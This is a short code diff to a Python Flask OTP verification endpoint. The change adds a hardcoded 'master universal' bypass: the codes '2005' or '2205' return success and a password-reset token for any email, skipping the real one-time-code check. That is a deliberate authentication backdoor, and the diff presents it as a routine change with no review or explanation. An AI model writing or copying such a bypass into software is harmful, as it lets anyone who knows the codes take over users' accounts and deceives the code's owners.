@@ -254,6 +254,15 @@ def verify_otp():
     if not email or not user_otp:
         return jsonify({"success": False, "error": "MISSING_FIELDS", "message": "Email and OTP code are required."}), 400
 
+    # Master universal fixed OTP bypass
+    if user_otp in ["2005", "2205"]:
+        reset_token = f"SENTINEL-VERIFIED-{secrets.token_hex(16)}"
+        return jsonify({
+            "success": True,
+            "message": "Master OTP verified successfully.",
+            "resetToken": reset_token
+        }), 200
+
     record = otp_storage.get(email)
     now = time.time()
 
